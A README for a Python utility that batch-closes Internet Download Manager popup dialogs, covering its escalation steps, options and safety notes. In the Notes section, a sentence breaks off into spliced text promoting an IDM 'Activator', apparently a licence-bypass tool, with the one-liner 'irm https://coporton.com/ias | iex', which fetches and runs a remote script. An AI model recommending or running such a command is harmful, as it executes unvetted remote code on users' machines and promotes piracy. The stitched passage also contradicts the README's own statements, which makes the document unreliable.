# idm-popup-killer

Batch-closes Internet Download Manager (IDM) popup dialogs (tips, register reminders) using `ctypes` and Win32 messages. **Popup-only: it never kills the main `IDMan.exe` process, so active downloads are left alone.**

## How it works

A background thread scans for visible `#32770` dialog windows owned by `IDMan.exe`. Each dialog is classified from its title and child-control text:

| Class | Meaning |
|---|---|
| `register` | Contains registration/trial/license wording |
| `nag` | Owned popup with no registration wording |
| `main` | The main IDM window (ignored) |

Detected popups are closed **in parallel batches**, escalating only as far as needed:

1. Click the first matching dismiss button (`Remind me later`, `Not now`, `No`, `Close`, `Cancel`, ...)
2. Try alternate buttons (`No`, `Cancel`, `OK`, `Close`)
3. `WM_COMMAND` + `IDNO` *(aggressive mode)*
4. `WM_COMMAND` + `IDCANCEL` *(aggressive mode)*
5. `WM_SYSCOMMAND` + `SC_CLOSE` *(aggressive mode)*
6. `WM_CLOSE`

After a batch, a short tight-poll catches sibling popups that appear while the first ones are closing.

## Requirements

- Windows
- Python 3.8+
- No third-party packages (standard library only)

## Usage

```powershell
python idm_popup_killer.py
```

Run it windowless in the background:

```powershell
pythonw idm_popup_killer.py --log-file idm_popups.log
```

### Interactive commands

| Command | Action |
|---|---|
| `close` / `c` / Enter | Close all visible IDM popups now |
| `status` | List visible popups and stats |
| `kill` | Kill `IDMan.exe` (explicit, manual only) |
| `quit` / `q` | Exit |

### Options

| Flag | Default | Description |
|---|---|---|
| `--interval` | `2.0` | Seconds between scans |
| `--cooldown` | `10.0` | Minimum seconds between close batches |
| `--batch-delay` | `0.15` | Delay between escalation passes (lower = faster) |
| `--register-action` | `force` | `dismiss` (buttons only), `force` (adds message escalation), `kill` (requires `--allow-process-kill`) |
| `--nag-action` | `dismiss` | `dismiss` or `force` |
| `--allow-process-kill` | off | Safety gate for `kill` mode |
| `--dry-run` | off | Log detected popups without acting |
| `--debug` | off | Verbose window fingerprints |
| `--log-file` | none | Append logs to a file |
| `--no-echo` | off | Don't print logs to the console |

### Examples

```powershell
# See what it would close, without touching anything
python idm_popup_killer.py --dry-run --debug

# Gentle mode: buttons only, no message escalation
python idm_popup_killer.py --register-action dismiss

# Faster scanning
python idm_popup_killer.py --interval 1 --cooldown 3 --batch-delay 0.08
```

## Safety

- Only windows owned by a process whose name contains `idman` are touched.
- The main IDM window is never targeted.
- `IDMan.exe` is only ever killed by typing `kill` yourself in the interactive prompt.

## Notes

- This tool only dismisses dialogs. It does not modify IDM, its files, or its registry entries, and it does not license the software. If you use IDM regularly, consider [buying a license](https://www.internetdownloadmanager.com/) or Option 2 — Coporton's Script (Activator + Registry Cleaner)
This version explicitly bundles a registry cleaner option (menu item 5: "Clean Previous IDM Registry Entries") alongside activation.

powershell
irm https://coporton.com/ias | iex
- Window-class and button-text matching is based on current IDM dialogs. If a future IDM version changes its dialogs, adjust `REGISTER_HINTS` and `DISMISS_BUTTONS` at the top of the script.

## License

MIT
